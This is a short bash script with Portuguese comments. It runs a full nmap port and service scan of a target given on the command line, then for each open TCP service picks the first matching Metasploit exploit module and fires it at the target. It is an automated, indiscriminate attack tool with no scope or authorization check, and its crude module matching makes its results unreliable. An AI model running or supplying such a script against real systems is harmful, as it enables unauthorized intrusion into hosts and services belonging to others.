#!/bin/bash

# Definindo variáveis
alvo=$1
arquivo_saida_nmap=$2

# Escaneamento de portas e serviços com o nmap
echo "Realizando escaneamento de portas e serviços com o nmap..."
nmap -sS -sV -p- -T4 -oA $arquivo_saida_nmap $alvo

# Identificação de vulnerabilidades e exploração com o Metasploit
echo "Identificando vulnerabilidades e tentando explora-las com o Metasploit..."
servicos=$(grep -E "^[0-9]+/tcp" $arquivo_saida_nmap.nmap | awk '{print $1"/"$3}')
for servico in $servicos; do
  nome_modulo=$(msfconsole -q -x "search $servico; exit" | grep -E "^exploit/" | head -n 1 | awk '{print $1}')
  if [ ! -z "$nome_modulo" ]; then
    echo "Executando módulo de exploit $nome_modulo para o serviço $servico..."
    msfconsole -q -x "use $nome_modulo; set RHOSTS $alvo; run; exit"
  fi
done
